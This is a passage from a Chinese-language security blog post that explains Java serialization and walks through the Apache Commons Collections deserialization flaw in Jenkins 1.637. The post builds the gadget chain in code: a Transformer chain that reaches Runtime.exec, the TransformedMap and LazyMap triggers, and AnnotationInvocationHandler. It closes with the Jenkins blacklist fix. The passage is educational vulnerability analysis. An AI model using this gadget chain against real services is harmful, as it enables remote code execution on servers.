<span class="keyword">public</span> <span class="title function_">ExternalizationDemo</span><span class="params">(String s, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stringField = s;</span><br><span class="line">        <span class="built_in">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExternalizationDemo</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>序列化之后得到的二进制串如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 13  45 78 74 65 72 6e 61 6c    ....sr.. External</span><br><span class="line">69 7a 61 74 69 6f 6e 44  65 6d 6f d9 a9 04 75 84    izationD emo...u.</span><br><span class="line">5d 06 8f 0c 00 00 78 70  77 0b 00 05 67 79 79 79    ].....xp w...gyyy</span><br><span class="line">79 00 01 7d f1 78                                   y..&#125;.x</span><br></pre></td></tr></table></figure></div>

<p>与<code>Serializable</code>的区别：</p>
<ul>
<li>对象的序列化属性标志位为<code>0x0c</code>，包括<code>Serializable</code>和Block Data的标志</li>
<li>序列化类的字段个数固定为0</li>
<li>序列化调用<code>writeExternalData()</code>转给类自定义的写方法，将写入的数据包装在新的Block Data块中，第一个字节为块长度 <em>（不含块头尾标识）</em></li>
<li>反序列化调用<code>readExternalData()</code>转给类自定义的读方法，再调用对象的无参构造方法 <em>（若不存在，则返回<code>null</code>）</em> 进行实例化</li>
</ul>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>通过以上对Java的序列化机制的大致了解，我们可以想象一个场景 <em>（有基础的同学可以跳过本部分内容，当然，看一看也没坏处）</em> ：</p>
<blockquote>
<p>当服务端允许接收远端数据进行反序列化时，客户端可以提供任意一个服务端存在的对象 <em>（包括依赖包中的对象）</em> 的序列化二进制串，由服务端反序列化成相应对象。如果该对象是由攻击者『精心构造』的恶意对象，而它自定义的<code>readObject()</code>中存在着一些『不安全』的逻辑，那么在对它反序列化时就有可能出现安全问题。</p>
</blockquote>
<p>说到这，我提三个问题，请大家跟着我的思路去分析，先来看看第一个：</p>
<ol>
<li>为什么需要依赖反序列化对象的自定义<code>readObject()</code>？</li>
</ol>
<p>大家都知道，正常来说，反序列化只是一个对象实例化然后赋值的过程，如果之后不主动调用它的内部方法，理论上最多只能控制它字段的值而已。那么有没有什么办法能够让它执行反序列化以外的逻辑呢？毕竟做的越多中间产生问题的概率就越大。</p>
<p>我们还是先以大家更熟悉的PHP来举个例。在PHP内部，保留了十多个被称为魔术方法的类方法，这些魔术方法一般会伴随着类的生命周期被PHP底层自动调用，用户可以在类中显式定义它们的逻辑。</p>
<p>就拿与反序列化关系最密切的<code>__wakeup()</code>来说，我们回到最初的那个类<code>SerializationDemo</code>，给它加一点东西：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;stringField;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在反序列化<code>SerializationDemo</code>这个对象时，就会调用<code>__wakeup()</code>执行里面的逻辑。示例中的逻辑只是输出一个字符串，如果改成<code>exec($this-&gt;stringField);</code>呢？</p>
<p>实际当然不会这么简单，有可能它是把自己的字段作为值作为参数调用了某个类的方法，而那个方法里对参数做了某些不安全的操作，甚至有可能经过多个类多个方法调用，形成一个调用链。</p>
<p>这就是默认的反序列化逻辑的一个逃逸过程。</p>
<p>到这里你可能已经想到了，Java反序列化中<code>readObject()</code>的作用其实就相当于PHP反序列化中的那些魔术方法，使反序列化过程在一定程度上受控成为可能，但也只是可能而已，是否真的可控，还是需要分析每个对象的<code>readObject()</code>具体是如何实现的 <em>（别急，后面有章节会有详细介绍）</em> 。</p>
<p>接着看第二个问题：</p>
<ol start="2">
<li>反序列化对象的非<code>Serializable</code>父类无参构造方法是否能像PHP中的<code>__construct()</code>一样被利用？</li>
</ol>
<p>答案应该是不行的。因为前面已经提到过，我们只能够控制反序列化对象的字段值，而Java与PHP不同的是，JDK底层会先调用无参构造方法实例化，再读取序列化的字段数据赋值，所以我们没有办法将可控的字段值在实例化阶段传入构造方法中对其内部逻辑产生影响。</p>
<p>最后一个：</p>
<ol start="3">
<li><code>readResolve()</code>对反序列化漏洞有什么影响？</li>
</ol>
<p><code>readResolve()</code>只是替换反序列化结果对象，若是结果对象本身存在安全问题，它有可能让问题中断；若是<code>readObject()</code>存在安全问题，它无法避免。</p>
<h3 id="经典的Apache-Commons-Collections"><a href="#经典的Apache-Commons-Collections" class="headerlink" title="经典的Apache Commons Collections"></a>经典的Apache Commons Collections</h3><p>好，有了上面的基础，我们也照一回惯例，带大家一起分析一下Java历史上最出名也是最具代表性的Apache Commons Collections反序列化漏洞。</p>
<p>网上很多文章都是以WebLogic为漏洞环境，我们尊重开源，围绕1.637版本的Jenkins来开个头，先简单看看它的Cli组件的反序列化场景 <em>（这里只以CLI-connect协议为例，CLI2-connect会多出来一个SSL加解密的过程，这也是很多公开PoC在模拟Cli握手时选择CLI-connect协议的原因）</em> ：</p>
<ol>
<li>客户端向发送一个UTF8字符串<code>Protocol:CLI-connect</code>，前两位为字符串长度</li>
<li>服务端<code>TcpSlaveAgentListener</code>在接收到数据之后，会创建一个<code>ConnectionHandler</code>对象读取一个UTF8字符串，判断协议版本，交给对应的协议进行处理<ul>
<li><code>CliProtocol</code>响应<code>Welcome</code>字符串，由<code>ChannelBuilder</code>为两端创建一个包含了<code>Connection</code>对象 <em>（IO流对象在里面）</em> 的<code>Channel</code>通信通道，并调用<code>negotiate()</code>进行交互<ul>
<li><code>Capability.writePreamble()</code>响应序列化后的<code>Capability</code>对象，其中使用<code>Mode.TEXT.wrap()</code>将输出流包装为<code>BinarySafeStream</code>，它会在写时进行Base64编码</li>
<li>由于<code>ChannelBuilder</code>在build之前，调用了<code>withMode()</code>设置<code>mode</code>为<code>Mode.BINARY</code>，因此还会响应一个<code>0x00000000</code></li>
<li>等待接收后续数据，判断数据内容前缀为<code>Capability.PREAMBLE</code> <em>（<code>&lt;===[JENKINS REMOTING CAPACITY]===&gt;</code>）</em> 时，将<code>InputStream</code>传给<code>Capability.read()</code><ul>
<li><code>Capability</code>同样会对输入流做一次<code>BinarySafeStream</code>包装，保证在读数据时解码得到原始二进制数据，再扔给输入流的<code>readObject()</code>继续读</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>回看<code>Connection</code>中自定义的<code>readObject()</code>，是一个普普通通的<code>ObjectInputStream</code>反序列化：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>现在我们假设已知1.637版本的Jenkins引用了存在反序列化漏洞的Commons Collections的版本的Jar包，那么只需要利用它构造一个恶意对象的序列化串，在与Jenkins Cli完成握手之后，将其Base64编码后的字符串发送过去就行了 <em>（当然，千万别忘了前面那串酷酷的前缀）</em> 。</p>
<hr>
<h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>好的，现在让我们聚焦到Commons Collections内部，看看前辈们是如何利用它来让应用『产生』问题的。</p>
<p>我们先预备一个基本知识，在Java中，若想通过其原生JDK提供的接口执行系统命令，最常见的语句如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);</span><br></pre></td></tr></table></figure></div>

<p>很简单，一个单例模式的方法获取到<code>Runtime</code>的实例，再调用它的<code>exec()</code>执行命令。在表达式注入类RCE漏洞中也可以频繁看到利用各种条件特性来构造这段语句的身影，比如Struts2的OGNL：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(cmd)</span><br></pre></td></tr></table></figure></div>

<p>又比如Spring的SpEL：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure></div>

<p>这里替小白问个基础但又和接下来的内容有关的问题：为什么都要使用链式结构？</p>
<p>原因其实很简单，因为无论是表达式解析执行还是反序列化时，底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的。你也可以换个方式问自己，如果你第一次请求<code>Runtime.getRuntime()</code>，那如何保证第二次请求<code>rt.exec()</code>能够拿到第一次的<code>Runtime</code>对象呢？</p>
<p>了解了这个问题之后，我们就可以开始尝试用Commons Collections先来构造这个链式结构了。</p>
<p>前辈们为我们在Commons Collections中找到了一个用于对象之间转换的<code>Transformer</code>接口，它有几个我们用得着的实现类：</p>
<ol>
<li><code>ConstantTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><code>InvokerTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><code>ChainedTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>利用这几个对象，可以构造出下面这条链：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; cmd &#125;)&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trans);</span><br></pre></td></tr></table></figure></div>

<p>其中，数组的中间两个元素是最让人费解的，我们一句一句来解释 <em>（前方高能预警，请对照上面几个<code>Transformer</code>的逻辑仔细看，接下来的内容网上有些解释是存在出入的）</em> ：</p>
<ol>
<li>构造一个<code>ConstantTransformer</code>，把<code>Runtime</code>的<code>Class</code>对象传进去，在<code>transform()</code>时，始终会返回这个对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>getMethod</code>，参数为<code>getRuntime</code>，在<code>transform()</code>时，传入1的结果，此时的<code>input</code>应该是<code>java.lang.Runtime</code>，但经过<code>getClass()</code>后，<code>cls</code>为<code>java.lang.Class</code>，之后的<code>getMethod()</code>只能获取<code>java.lang.Class</code>的方法，因此才会定义的待调用方法名为<code>getMethod</code>，然后其参数才是<code>getRuntime</code>，它得到的是<code>getMethod</code>这个方法的<code>Method</code>对象，<code>invoke()</code>调用这个方法，最终得到的才是<code>getRuntime</code>这个方法的<code>Method</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>invoke</code>，参数为空，在<code>transform()</code>时，传入2的结果，同理，<code>cls</code>将会是<code>java.lang.reflect.Method</code>，再获取并调用它的<code>invoke</code>方法，实际上是调用上面的<code>getRuntime()</code>拿到<code>Runtime</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>exec</code>，参数为命令字符串，在<code>transform()</code>时，传入3的结果，获取<code>java.lang.Runtime</code>的<code>exec</code>方法并传参调用</li>
<li>最后把它们组装成一个数组全部放进<code>ChainedTransformer</code>中，在<code>transform()</code>时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求</li>
</ol>
<p>既然第2、3步这么绕，我们又知道了为什么，是不是可以考虑用下面这种逻辑更清晰的方式来构造呢：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure></div>

<p>答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于<code>Runtime.getRuntime()</code>得到的是一个对象，这个对象也需要参与序列化过程，而<code>Runtime</code>本身是没有实现<code>Serializable</code>接口的，所以会导致序列化失败。</p>
<p>也有同学可能看过ysoserial构造的Payload，它的习惯是先定义一个包含『无效』<code>Transformer</code>的<code>ChainedTransformer</code>，等所有对象装填完毕之后再利用反射将实际的数组放进去。这么做的原因作者也在一个<a href="https://github.com/frohoff/ysoserial/issues/32">Issue</a>中给了解释，我们直接看原文：</p>
<blockquote>
<p>Generally any reflection at the end of gadget-chain set up is done to “arm” the chain because constructing it while armed can result in premature “detonation” during set-up and cause it to be inert when serialized and deserialized by the target application.</p>
</blockquote>
<p>现在，有了这条<code>Transformer</code>链，就等着谁来执行它的<code>transform()</code>了。</p>
<p>网上流传的示例很多都是使用一个名为<code>TransformedMap</code>的装饰器来触发<code>transform()</code>，它在装饰时会传入原始<code>Map</code>、一个键转换器<code>Transformer</code>和一个值转换器<code>Transformer</code>，而它的父类在内部实现了一个<code>AbstractMapEntryDecorator</code>的子类，会在<code>setValue()</code>前调用<code>checkSetValue()</code>进行检查，而<code>TransformedMap.checkSetValue()</code>会调用它的值转换器的<code>transform()</code>，因此装饰任意一个有元素的<code>Map</code>就可以满足需求：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>()&#123;&#123; put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;anything&quot;</span>); &#125;&#125;, <span class="literal">null</span>, chain);</span><br></pre></td></tr></table></figure></div>

<p>这时，我们只需要再找一个包含可控<code>Map</code>字段，并会在反序列化时对这个<code>Map</code>进行<code>setValue()</code>或<code>get()</code>操作的公共对象。</p>
<p>幸运的是，前辈们在JDK较早的版本中发现了<code>AnnotationInvocationHandler</code>这个对象 <em>（较新版本的JDK可以使用<code>BadAttributeValueExpException</code>，在这里就不展开了）</em> ，它在初始化时可以传入一个<code>Map</code>类型参数赋值给字段<code>memberValues</code>，<code>readObject()</code>过程中如果满足一定条件就会对<code>memberValues</code>中的元素进行<code>setValue()</code>：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                    value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，在遍历<code>memberValues.entrySet()</code>时，会用键名在<code>memberTypes</code>中尝试获取一个<code>Class</code>，并判断它是否为<code>null</code>，这就是刚才说的需要满足的条件。接下来是网上很少提到过的一个结论：</p>
<p>首先，<code>memberTypes</code>是<code>AnnotationType</code>的一个字段，里面存储着<code>Annotation</code>接口声明的方法信息 <em>（键名为方法名，值为方法返回类型）</em> 。因此，我们在获取<code>AnnotationInvocationHandler</code>实例时，需要传入一个方法个数大于0的<code>Annotation</code>子类 <em>（一般来说，若方法个数大于0，都会包含一个名为<code>value</code>的方法）</em> ，并且原始<code>Map</code>中必须存在任意以这些方法名为键名的元素，且元素值不是该方法返回类型的实例，才能顺利进入<code>setValue()</code>的流程：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cls.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ctor.newInstance(Target.class, m);</span><br></pre></td></tr></table></figure></div>

<p>以上是<code>TransformedMap</code>的利用构造过程。而ysoserial官方更倾向于使用<code>LazyMap</code>作为装饰器，它在装饰时会传入原始<code>Map</code>和一个<code>Transformer</code>作为工厂，当<code>get()</code>获取值时，若键不存在，就会调用工厂的<code>transform()</code>创建一个新值放入<code>Map</code>中，因此装饰任意一个空<code>Map</code>也可以满足需求：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br></pre></td></tr></table></figure></div>

<p>但与<code>TransformedMap</code>不同的是，<code>AnnotationInvocationHandler.readObject()</code>中并没有直接的对<code>memberTypes</code>执行<code>get()</code>操作，反而是在它的<code>invoke()</code>中存在<code>get()</code>，但又对方法名有一定的要求：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;hashCode&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;annotationType&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以，ysoserial使用Java动态代理的方式处理了 <code>LazyMap</code> ，使 <code>readObject()</code>在调用<code>memberValues.entrySet()</code> 时代理进入<code>AnnotationInvocationHandler.invoke()</code>阶段，刚好方法名<code>entrySet</code>也可以顺利的跳过前面的几个判断条件，最终达到目的。这也是为什么Payload中会包含两个<code>AnnotationInvocationHandler</code>的原因。</p>
<hr>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>Jenkins在1.638版本的 <code>Connection.readObject()</code> 中，将默认的<code>ObjectInputStream</code>改为了其自定义的子类<code>ObjectInputStreamEx</code>，并传入<code>ClassFilter.DEFAULT</code>校验过滤：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStreamEx</span>(in,</span><br><span class="line">            getClass().getClassLoader(), ClassFilter.DEFAULT);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>ClassFilter.DEFAULT</code> 长这样：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassFilter</span> <span class="variable">DEFAULT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassFilter</span>() &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isBlacklisted</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.startsWith(<span class="string">&quot;org.codehaus.groovy.runtime.&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.startsWith(<span class="string">&quot;org.apache.commons.collections.functors.&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name.contains(<span class="string">&quot;org.apache.xalan&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>还是一个简简单单的黑名单。</p>
<h2 id="POP的艺术"><a href="#POP的艺术" class="headerlink" title="POP的艺术"></a>POP的艺术</h2><p>既然反序列化漏洞常见的修复方案是黑名单，就存在被绕过的风险，一旦出现新的POP链，原来的防御也就直接宣告无效了。</p>
<p>所以在反序列化漏洞的对抗史中，除了有大佬不断的挖掘新的反序列化漏洞点，更有大牛不断的探寻新的POP链。</p>
<p>POP已经成为反序列化区别于其他常规Web安全漏洞的一门特殊艺术。</p>
<p>既然如此，我们就用ysoserial这个项目，来好好探究一下现在常用的这些RCE类POP中到底有什么乾坤：</p>
